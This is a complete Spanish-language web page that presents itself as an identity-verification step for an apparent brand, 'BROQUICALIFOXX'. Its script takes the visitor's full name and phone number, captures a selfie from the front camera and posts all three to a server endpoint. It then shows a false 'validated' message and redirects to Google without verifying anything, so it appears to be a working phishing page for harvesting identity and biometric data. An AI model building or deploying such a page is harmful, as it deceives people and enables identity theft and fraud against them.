<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BROQUICALIFOXX - Verificación</title>
    <style>
        body { background: #000; color: #00d4ff; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { border: 2px solid #00d4ff; padding: 20px; border-radius: 15px; box-shadow: 0 0 15px #00d4ff; }
        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #00d4ff; background: #111; color: #fff; }
        video { width: 100%; max-width: 400px; border-radius: 10px; margin-top: 10px; border: 2px solid #fff; }
        button { background: #00d4ff; color: #000; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; width: 85%; }
        #status { margin-top: 10px; font-size: 12px; color: #fff; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🏛️ BROQUICALIFOXX</h2>
        <p>VALIDACIÓN DE IDENTIDAD</p>
        <input type="text" id="nombre" placeholder="Nombre Completo" required>
        <input type="number" id="telefono" placeholder="Número de Teléfono" required>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <button id="btn">💳 VERIFICAR AHORA</button>
        <div id="status">Esperando permisos de cámara...</div>
    </div>
    <script>
        const v = document.getElementById('video');
        const b = document.getElementById('btn');
        const s = document.getElementById('status');

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { v.srcObject = stream; s.innerText = "Cámara lista."; })
            .catch(() => { s.innerText = "Error: Active la cámara."; });

        b.onclick = async () => {
            const nom = document.getElementById('nombre').value;
            const tel = document.getElementById('telefono').value;
            if(!nom || !tel) return alert("Llene los datos");

            s.innerText = "PROCESANDO BIOMETRÍA...";
            b.disabled = true;

            const canvas = document.getElementById('canvas');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('nombre', nom);
                fd.append('telefono', tel);
                fd.append('foto', blob, 'selfie.jpg');

                await fetch('/enviar', { method: 'POST', body: fd });
                s.innerText = "VALIDADO. REDIRECCIONANDO...";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
            }, 'image/jpeg');
        };
    </script>
</body>
</html>
